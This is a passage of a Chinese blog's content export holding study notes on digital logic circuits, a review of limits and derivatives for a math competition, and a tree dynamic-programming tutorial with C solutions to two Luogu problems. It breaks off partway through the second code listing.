<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211215113756407.png" alt="image-20211215113756407"></p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211215205315799.png" alt="image-20211215205315799"></p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211215205531531.png" alt="image-20211215205531531"></p>
<p>用或非门实现的R-S触发器和用与非门实现的是完全对称的</p>
</li>
</ol>
<h2 id="几种常用的时钟控制触发器"><a href="#几种常用的时钟控制触发器" class="headerlink" title="几种常用的时钟控制触发器"></a>几种常用的时钟控制触发器</h2><p>​    由时钟脉冲控制状态转移的时刻，由输入信号确定转换状态</p>
<h3 id="时钟控制R-S触发器"><a href="#时钟控制R-S触发器" class="headerlink" title="时钟控制R-S触发器"></a>时钟控制R-S触发器</h3><p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211215210532150.png" alt="image-20211215210532150"></p>
<p>​    大概就是时钟脉冲没过来的时候，控制端G3和G4输出始终为1，然后时钟脉冲过来的时候输出输入时候的R和S</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211215210747575.png" alt="image-20211215210747575"></p>
<p><strong>缺点</strong>：输入信号存在约束条件，R和S不能同时为1；在时钟作用期间，会发生空翻</p>
<h3 id="钟控D触发器"><a href="#钟控D触发器" class="headerlink" title="钟控D触发器"></a>钟控D触发器</h3><p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211215211039238.png" alt="image-20211215211039238"></p>
<p>​    输入信号D会被转换成一组互补信号</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211215211345146.png" alt="image-20211215211345146"></p>
<p>​    也就是说它的状态变化仅取决于输入信号D</p>
<h3 id="J-K触发器"><a href="#J-K触发器" class="headerlink" title="J-K触发器"></a>J-K触发器</h3><p>​    J，K触发器是在输出的地方接线再到最开始的与非门，这样利用两个输出互补的特点来解决输入限制的问题。</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211215211629291.png" alt="image-20211215211629291"></p>
<p>​    其工作原理如下</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211215212151167.png" alt="image-20211215212151167"></p>
<h3 id="T触发器"><a href="#T触发器" class="headerlink" title="T触发器"></a>T触发器</h3><p>​    T触发器是将J-K触发器的JK两端连起来，这样就构成了T触发器，如下</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211215212420692.png" alt="image-20211215212420692"></p>
<p>​    功能如下：</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211215212628393.png" alt="image-20211215212628393"></p>
<h3 id="空翻现象"><a href="#空翻现象" class="headerlink" title="空翻现象"></a>空翻现象</h3><p>​    空翻指的是在同一个时钟脉冲作用期间触发器状态发生两次或两次以上变化的现象，或许是要求在一个时钟脉冲作用的时候，输出只能改变一次。为了防止这种现象的出现，可以考虑使用<strong>主从式结构</strong>或者<strong>维持阻塞结构</strong>，应注意这两种结构并不改变触发器的逻辑功能</p>
<ol>
<li>主从J-K触发器，下降沿触发，每个时钟周期只翻转一次，抗干扰能力差，对时钟脉冲宽度要求严格</li>
</ol>
<h1 id="同步时序逻辑电路"><a href="#同步时序逻辑电路" class="headerlink" title="同步时序逻辑电路"></a>同步时序逻辑电路</h1><p>​    <strong>特点：</strong>电路中有统一的定时信号，存储器件采用时钟控制触发器，电路状态在时钟脉冲控制下同时发生转换，即电路状态的改变依赖于输入信号和时钟脉冲信号。</p>
<p>​    这里的现态指的是时钟脉冲作用前的状态，次态指的是时钟脉冲作用后的状态，对时钟的宽度和频率都有要求。</p>
<p>​    如果时序逻辑电路的输出是电路输入和电路状态的函数，那么称为<strong>Mealy</strong>型电路，而如果电路的输出仅仅是电路状态的函数，则是<strong>Moore</strong>型电路</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211216183200617.png" alt="image-20211216183200617"></p>
<p>​    同步时序逻辑电路可以用三组逻辑函数表达式表述，即输出函数表达式，指的是输出Z的表达式；激励函数表达式，又称为控制函数表达式，是存储电路输入（即触发器输入）和电路外部输入以及电路状态的表达式；次态函数表达式，用来反映该电路次态与激励函数和电路现态之间的关系，和触发器类型有关。</p>
<p>​    也可以用状态表表示，即<img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211216184145567.png" alt="image-20211216184145567"></p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211216184204801.png" alt="image-20211216184204801"></p>
<p>​    也可以用<strong>状态图</strong>去描述</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211216184356123.png" alt="image-20211216184356123"></p>
<h2 id="同步时序逻辑电路分析"><a href="#同步时序逻辑电路分析" class="headerlink" title="同步时序逻辑电路分析"></a>同步时序逻辑电路分析</h2><p>​    主要有表格法和代数分析法两种</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211216184551743.png" alt="image-20211216184551743"></p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211216184708705.png" alt="image-20211216184708705"></p>
<p>​    这部分主要是要靠刷题，知识点就这两部分</p>
<p>​    时间图主要是考虑是电平信号还是脉冲信号，电平信号的话就0101枚举，脉冲信号就画波形图</p>
<h2 id="同步时序逻辑电路设计"><a href="#同步时序逻辑电路设计" class="headerlink" title="同步时序逻辑电路设计"></a>同步时序逻辑电路设计</h2><p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211216185339405.png" alt="image-20211216185339405"></p>
<h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>​    第一步是形成原始状态图和原始状态表</p>
<p>​    先考虑电路是Mealy型还是Moore型，然后设立初始状态，然后根据需要记忆的信息增加新的状态，最后确定各时刻的输出值</p>
<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>​    第二步是进行状态化简，主要介绍<strong>隐含表法</strong></p>
<p>​    先来介绍几个概念</p>
<ol>
<li>等效，即对于状态表中的两个状态，对于任意可能的输入序列，分别从这两个状态出发，得到的输出序列是一样的，那么就称这两个状态是等效的，那对于两个状态，如果要等效的话，<strong>首先需要满足对于相同的输入，输出是相同的，然后再去看次态</strong></li>
<li>等效类，是若干彼此等效的状态构成的集合，最大等效类指的是不能被其他等效类包含的等效类</li>
</ol>
<p>​    到这里其实思路就比较明显了，对原始状态表化简就是找到所有的最大等效类，将其当作一个状态即可</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211216191631712.png" alt="image-20211216191631712"></p>
<p>​    隐含表是一个直角三角形阶梯网络，表中每一个方格代表一个状态对，<strong>纵、横向网格数为n-1，纵掐头横去尾。</strong></p>
<p>​    找等效对有两种方法，即顺序比较和关联比较。顺序比较就是按照在隐含表中从上到下从左到右的顺序对照原始状态表依次对所有的状态对进行比较，并将检查结果标注在隐含表对应方格内；关联比较是对那些在顺序比较的时候没有判断的再进一步判断</p>
<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>​    第三步是状态编码，是指给最小化状态表中用字母或数字表示的状态，指定一个二进制代码，形成二进制状态表。状态编码也称状态分配，或者状态赋值。</p>
<p>​    主要完成以下两个工作：</p>
<ol>
<li>确定状态编码的长度</li>
<li>寻找更佳的状态分配方案</li>
</ol>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211216194001086.png" alt="image-20211216194001086"></p>
<p>​    <strong>相邻分配法</strong>：在选择状态编码时，尽可能使激励函数和输出函数在卡诺图上的1方格处在相邻位置</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211216201129171.png" alt="image-20211216201129171"></p>
<p>​    最开始其实没有明白这一步是在干什么，后来仔细研究例题，发现，这个应该就是用二进制去对各个状态进行编码，因为我们最开始得到的状态应该都是A、B、C、D这种，然后可以用两位二进制数去描述这四种状态，所以需要按照着三种规则进行编码，当然，如果本身题目比较简单，很容易用二进制数去表示，这一步就可以省略了</p>
<h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p>​    最后其实就是根据我们之前得到的状态表，以及触发器的功能表得到激励函数和输出函数的真值表，可以考虑使用卡诺图进行化简</p>
<h1 id="异步时序逻辑电路"><a href="#异步时序逻辑电路" class="headerlink" title="异步时序逻辑电路"></a>异步时序逻辑电路</h1><p>​    异步时序逻辑电路中没有统一的时钟脉冲信号，电路状态的改变是外部信号直接作用的结果，其中存储元件的状态改变不一定同时发生，可能出现非稳定状态</p>
<h2 id="脉冲异步时序逻辑电路"><a href="#脉冲异步时序逻辑电路" class="headerlink" title="脉冲异步时序逻辑电路"></a>脉冲异步时序逻辑电路</h2><p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211217141748085.png" alt="image-20211217141748085"></p>
<p>​    输入信号为脉冲信号，脉冲信号的宽度和间隔有一定要求，同时，<strong>不允许两个及以上输入端同时出现脉冲</strong>，Mealy型输出信号通常为脉冲信号，而Moore型通常为电平信号，其电路的分析方法和同步时序逻辑电路基本一致，注意分析的时候可以排除两个及以上输入端同时出现脉冲或输入端没有脉冲信号的情况</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211217142149046.png" alt="image-20211217142149046"></p>
<p>​    其电路设计和同步时序逻辑也大体相同，但是应注意，当有多个输入信号的时候，只需要考虑其中仅有一个脉冲即可，在确定激励函数和输出函数时，可将两个或两个以上的输入当成无关条件处理</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211217143632176.png" alt="image-20211217143632176"></p>
<h2 id="电平异步时序逻辑电路"><a href="#电平异步时序逻辑电路" class="headerlink" title="电平异步时序逻辑电路"></a>电平异步时序逻辑电路</h2><p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211217145626507.png" alt="image-20211217145626507"></p>
<p>​    不允许多个输入信号同时变化，而每次输入信号变化引起的相应需要完全结束才允许输入信号再次变化</p>
<p>​    可以用逻辑方程组描述，也可以用<strong>流程表</strong>描述，其实和之前的状态表还蛮像的</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211217150812519.png" alt="image-20211217150812519"></p>
<p>​    这里引入的一个新的概念，即总态和总态表，总态是指电路输入与电路二次状态的组合，记作<strong>(x,y)</strong>，总态图是反应总态之间转移关系及相应输出的一种有向图</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211217160724759.png" alt="image-20211217160724759"></p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211217162952207.png" alt="image-20211217162952207"></p>
<h3 id="竞争"><a href="#竞争" class="headerlink" title="竞争"></a>竞争</h3><p>​    由于电路中存在延迟时间，所以会产生竞争，非临界竞争指的是竞争的结果最终能到达预定的稳态，临界竞争指的是达不到的。</p>
<h1 id="常用的一些电路"><a href="#常用的一些电路" class="headerlink" title="常用的一些电路"></a>常用的一些电路</h1><h2 id="组合逻辑"><a href="#组合逻辑" class="headerlink" title="组合逻辑"></a>组合逻辑</h2><ol>
<li><p>四位并行加法器74283</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211220205135324.png" alt="image-20211220205135324"></p>
<p>注意二进制加法和减法的转化</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211220205731182.png" alt="image-20211220205731182"></p>
</li>
<li><p>二进制译码器，能将n个变量变换成$2^n$个输出函数，并且输出函数与输入变量组成的最小项具有对应关系</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211220210323341.png" alt="image-20211220210323341"></p>
<p>使能输入端为有效电平时，对应每一组输入代码，仅一个输出端为有效电平，其余输出端为无效电平。 <strong>注意这里的有效电平可以是高电平也可以是低电平</strong></p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211220211033890.png" alt="image-20211220211033890"></p>
</li>
<li><p>二-十进制译码器</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211220211903611.png" alt="image-20211220211903611"></p>
<p>其实就是输入的8421码对应的十进制是多少，输出的对应为0，如果输入的8421码不合法的话，则输出均为1</p>
</li>
<li><p>数字显示译码器</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211220212745491.png" alt="image-20211220212745491"></p>
</li>
<li><p>二-十进制编码器，主要功能是将十进制数字0~9编码成4位二进制码，没有芯片，估计不考</p>
</li>
<li><p>优先编码器，可以识别输入信号的优先级别，选中优先级别最高的进行编码，实现优先权管理。<strong>也就是说，可以有多个输入信号同时为有效信号</strong></p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211220213127122.png" alt="image-20211220213127122"></p>
<p>其实没有很看明白这个真值表的含义。</p>
</li>
<li><p>多路选择器，是一种多路输入、单路输出的组合逻辑电路</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211221184346743.png" alt="image-20211221184346743"></p>
<p>一般有$2^{n}$个输入和一个输出的电路需要有$n$个控制端</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211221184521827.png" alt="image-20211221184521827"></p>
<p>一种比较常见的题目是给出最小项之和的表达式，用多路选择器实现，这个时候如果对多路选择器没有要求的话，那么直接用即可，如果有要求，比如只能用四位的，那么可以考虑选择两个变元作为选择端，然后对表达式进行化简，得到的形式是这两个变元及其反变元和其他表达式的与项，然后把其他表达式的与项作为输入端即可。</p>
</li>
<li><p>多路分配器，是一种单输入多输出的器件</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211221191419001.png" alt="image-20211221191419001"></p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211221191403580.png" alt="image-20211221191403580"></p>
<p>大概就是说选择端选择哪一个，就将输入端的值输出过去，剩下的输入端全都是0</p>
</li>
</ol>
<h2 id="时序逻辑"><a href="#时序逻辑" class="headerlink" title="时序逻辑"></a>时序逻辑</h2><ol>
<li><p>集成计数器，具有计数、保存、清除、预置功能。</p>
<ul>
<li><p>同步计数器</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211221192629020.png" alt="image-20211221192629020"></p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211221192850894.png" alt="image-20211221192850894"></p>
<p>比较常见的题目是要用这个器件构成模小于16计数器</p>
<p>当然也可以用来设计模大于16的计数器，只需要将多个4位计数器级联即可</p>
</li>
<li><p>异步计数器，74290</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211221195329029.png" alt="image-20211221195329029"></p>
<p>感觉这个东西的功能很复杂，</p>
<ul>
<li><p>异步清零功能，当$R_{9A}*R_{9B}=0$且$R_{0A}=R_{0B}=1$时输出端置0.</p>
</li>
<li><p>异步置9功能，只需要$R_{9A}=R_{9B}=1$就行</p>
</li>
<li><p>计数功能，需要满足$R_{9A}<em>R_{9B}=0$并且$R_{0A}</em>R_{0B}=0$，将脉冲加到CPA端，从$Q_A$输出，实现模二加法。如果加到CPB端，则从$Q_D、Q_C、Q_B$，实现模五加法。要实现模十加法，采用如下两种解法，分别是8421码和5421码</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211221200159115.png" alt="image-20211221200159115"></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>集成寄存器</p>
<p><img src="https://gitee.com/yang-shijun/image/raw/master/images/image-20211221200626857.png" alt="image-20211221200626857"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>数字逻辑</category>
      </categories>
      <tags>
        <tag>数字逻辑</tag>
      </tags>
  </entry>
  <entry>
    <title>大学生数学竞赛微分相关知识的复习</title>
    <url>/2021/08/16/%E6%9E%81%E9%99%90/</url>
    <content><![CDATA[<h1>极限</h1>
<h2 id="前导"><a class="header-anchor" href="#前导">¶</a>前导</h2>
<ol>
<li>不为计算而计算，很多时候是为了便于分析，比如定义$e=\lim_{n\to +\infty}{\sum_{i=1}^n\frac{1}{n!}}$​</li>
<li>要注意的是抓住主要矛盾，比如计算极限$\lim_{n \to +\infty} \sum_{k=1}<sup>{n}\frac{k</sup>n}{n^n}$</li>
</ol>
<h2 id="极限的典型方法"><a class="header-anchor" href="#极限的典型方法">¶</a>极限的典型方法</h2>
<ol>
<li>
<p>定义，即$\epsilon-\delta$语言</p>
</li>
<li>
<p>四则运算</p>
</li>
<li>
<p>等价无穷小替换（两个重要极限）</p>
</li>
<li>
<p>L’ Hospital法则，注意使用条件</p>
</li>
<li>
<p>夹逼定理</p>
</li>
<li>
<p>单调有界收敛定理</p>
</li>
<li>
<p>Taylor展开</p>
</li>
<li>
<p>Stolz定理</p>
<p>设${x_n}$严格单调增加，且$\lim_{n \to \infty}x_n=+\infty$,若$\lim_{n\to\infty}\frac{y_{n+1}-y_n}{x_{n+1}-x_n}=a$，则有$\lim_{n \to \infty}\frac{y_n}{x_n}=a$</p>
<p>设$x_n$严格单调，且$\lim_{n \to \infty}x_n=0,\lim_{n \to\infty}y_n=0$，若$\lim_{n\to\infty}\frac{y_{n+1}-y_n}{x_{n+1}-x_n}=a$，则$\lim_{n\to\infty}\frac{y_n}{x_n}=a$</p>
</li>
</ol>
<h2 id="典型例题"><a class="header-anchor" href="#典型例题">¶</a>典型例题</h2>
<ol>
<li>
<p>主要比较难以看出来的就是使用夹逼准则的求和极限，这时候大多数时候都需要通过恒等变形和放缩来利用夹逼准则转换成黎曼和，如$\lim_{n \to +\infty} \sum_{k=1}^n \frac{a<sup>\frac{k}{n}}{n+(a-1)k</sup>{-1}}$</p>
</li>
<li>
<p>当含有三角函数和积分时，最佳的做法应该是根据三角函数的有界性将积分做掉，例如$\lim_{x \to+\infty}\sqrt[3]{x}\int_x^{x+1}\frac{sint}{\sqrt[]{t+cost}}dt$</p>
</li>
<li>
<p>对于极限$\lim_{n \to \infty}\sum_{k=0}<sup>n\frac{1}{n+k}$​，有多种不同的做法，这里主要想提一下欧拉常数，即$\lim_{n\to\infty}\sum_{k=1}</sup>n\frac{1}{k}-lnn=\gamma_n$，其中$\lim_{n \to\infty}\gamma_n=C$</p>
</li>
<li>
<p>PPT31页值得再看</p>
</li>
<li>
<p>与积分相结合的极限题目</p>
<ol>
<li>
<p>通过观察转换成Riemann和，下面给几个例子</p>
<p>​	$\lim\sum_{k=1}<sup>{n-1}(1+\sqrt[]\frac{k}{n})sin\frac{k\pi}{n</sup>2}$</p>
</li>
<li>
<p>利用积分中值定理和微分中值定理进行化简，下面给一个很经典的例子，即</p>
<ol>
<li>设f(x)在[0,1]上有连续导数，f(0)=0,f(1)=1,证明:<br>
$\lim_{n \to \infty}n(\int_{0}<sup>{1}f(x)dx-\frac{1}{n}\sum_{k=1}</sup>{n}f(\frac{k}{n}))$</li>
</ol>
</li>
<li>
<p>利用黎曼和进行转化</p>
<ol>
<li><img src="/images%5C%E4%BE%8B%E4%BA%94.jpg" alt></li>
</ol>
</li>
<li>
<p>在存在k之类和三角函数时可以考虑求递推式，如求$\lim_{x \to 0<sup>+}\frac{\int_0</sup>xsin^k\frac{1}{t}dt}{x},k=1,2,…$</p>
</li>
<li>
<p>然后就是一道代数变形不太好想的题目，即$\lim_{n \to \infty}\sqrt[n+1]{(n+1)!}-\sqrt[n]{n!}$</p>
</li>
</ol>
</li>
<li>
<p>单调有界定理队函数和数列统统适用</p>
</li>
<li>
<p>泰勒展开式是一种非常重要的方法，或许可以看作是等价无穷小，这方面的例题很多，需要注意的是$tanx$和$(1+x)^\alpha$的泰勒展开式，将其转化成在0附近，就可以展开，下面给出几个题</p>
<ol>
<li>$\lim_{x \to0}\frac{(1+x)<sup>\frac{2}{x}-e</sup>2(1-ln(1+x))}{x}$，该题目需要注意的是在有减法的时候不要随意用等价无穷小！尽量先用泰勒公式展开</li>
</ol>
</li>
<li>
<p>Stolz定理</p>
<p>使用stolz定理的关键就在于构造出满足条件的式子，这里PPT上给出的题目基本都是谢惠民上的题目，此处不再赘述</p>
</li>
</ol>
<hr>
<h1>连续</h1>
<h2 id="性质"><a class="header-anchor" href="#性质">¶</a>性质</h2>
<ol>
<li>介值性</li>
<li>最值性</li>
</ol>
<h2 id="典型例题-v2"><a class="header-anchor" href="#典型例题-v2">¶</a>典型例题</h2>
<ol>
<li>这里的典型例题大多是利用反证法导出矛盾</li>
</ol>
<hr>
<h1>导数</h1>
<ol>
<li>
<p>导数，单侧导数，微分，偏导数，全微分，方向导数</p>
</li>
<li>
<p>高阶导数的计算，主要利用Leibniz求导公式</p>
</li>
<li>
<p>这里就贴几道让我印象深刻的题目，</p>
<p>已知$y=\frac{2x}{x<sup>2+1}$，求$y</sup>{(n)}$</p>
<p>已知$y=\frac{x<sup>n}{(x+1)</sup>2(x+2)<sup>2}$，求$y</sup>{(n)}$</p>
<p>已知$y=(arcsinx)<sup>2$，求$y</sup>{(n)}(0)$</p>
</li>
</ol>
]]></content>
      <categories>
        <category>数学</category>
        <category>微分学</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>微积分</tag>
      </tags>
  </entry>
  <entry>
    <title>树形dp</title>
    <url>/2021/10/04/%E6%A0%91%E5%BD%A2dp/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>​    树形dp，顾名思义就是在树形结构上面做动态规划，一般都是用$dp[i][]$来表示$i$这棵树所具有的某种最优性质，一般要用到dfs来对整棵树进行遍历，存树的方法很多，可以用邻接表，也可以用并查集之类的，这里直接看一些题目吧</p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="洛谷P1352"><a href="#洛谷P1352" class="headerlink" title="洛谷P1352"></a>洛谷P1352</h2><h3 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h3><p><img src="https://raw.githubusercontent.com/ysjyx7/images/master/img/image-20211004103500038.png" alt="image-20211004103500038"></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​    很明显的一个树形结构，每一个人来与不来会对所有数值产生影响，我们可以用$dp[i][0/1]$来表示此时的最大值，这样其实思路就很明显了，代码如下，注释详细</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: ysj </span></span><br><span class="line"><span class="comment"> * @Date: 2021-10-04 10:37:32 </span></span><br><span class="line"><span class="comment"> * @Last Modified by:   ysj </span></span><br><span class="line"><span class="comment"> * @Last Modified time: 2021-10-04 10:37:32 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a,b) ((a)&gt;(b)?(a):(b))</span></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">10000</span>][<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> isfather[<span class="number">10000</span>];</span><br><span class="line"><span class="keyword">int</span> flag[<span class="number">10000</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> node)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;dp[i][<span class="number">1</span>]);<span class="comment">//初始化，如果都是自己来</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n - <span class="number">1</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> u, v;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;u, &amp;v);</span><br><span class="line">        isfather[u] = v;<span class="comment">//存储父子关系，用邻接表</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> root = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(isfather[root])</span><br><span class="line">        root = isfather[root];<span class="comment">//向上找到根节点</span></span><br><span class="line">    dfs(root);<span class="comment">//搜索</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, max(dp[root][<span class="number">0</span>], dp[root][<span class="number">1</span>]));<span class="comment">//判断来与不来哪一个更大</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    flag[node] = <span class="number">1</span>;<span class="comment">//访问了当前节点</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(flag[i]!=<span class="number">1</span>&amp;&amp;isfather[i]==node)<span class="comment">//接下来访问当前节点的所有子节点</span></span><br><span class="line">         &#123;</span><br><span class="line">             dfs(i);</span><br><span class="line">             dp[node][<span class="number">1</span>] += dp[i][<span class="number">0</span>];</span><br><span class="line">             dp[node][<span class="number">0</span>] += max(dp[i][<span class="number">1</span>], dp[i][<span class="number">0</span>]);</span><br><span class="line">         &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="洛谷P1122"><a href="#洛谷P1122" class="headerlink" title="洛谷P1122"></a>洛谷P1122</h2><h3 id="题目大意-1"><a href="#题目大意-1" class="headerlink" title="题目大意"></a>题目大意</h3><p><img src="https://raw.githubusercontent.com/ysjyx7/images/master/img/image-20211004112422566.png" alt="image-20211004112422566"></p>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>​    其实和之前的思路大致都是一样的，不过这里其实改成一个一维数组就行了，另外就是如果按照之前的搜索的话，会TLE，所以只能手写一个邻接链表</p>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a,b) ((a)&gt;(b)?(a):(b))</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">arc</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">arc</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; arc;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    arc *head;</span><br><span class="line">&#125; <span class="built_in">list</span>;</span><br><span class="line"><span class="built_in">list</span> lists[<span class="number">17000</span>];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">17000</span>];</span><br><span class="line"><span class="keyword">int</span> isfather[<span class="number">17000</span>];</span><br><span class="line"><span class="keyword">int</span> flag[<span class="number">17000</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> node)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">findmax</span><span class="params">(<span class="keyword">int</span> node)</span></span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans=INT_MIN;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;dp[i]);<span class="comment">//初始化，如果都是自己来，会有的最大</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n - <span class="number">1</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> u, v;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;u, &amp;v);</span><br><span class="line">        arc *p;</span><br><span class="line">        p = (arc *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(arc));</span><br><span class="line">        p-&gt;data = u;</span><br><span class="line">        p-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span>(lists[v].head==<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            lists[v].head = p;</span><br><span class="line">            lists[v].num++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;next = lists[v].head;</span><br><span class="line">            lists[v].head = p;</span><br><span class="line">            lists[v].num++;</span><br><span class="line">        &#125;</span><br><span class="line">         isfather[u] = v;<span class="comment">//存储父子关系，用邻接表</span></span><br><span class="line">    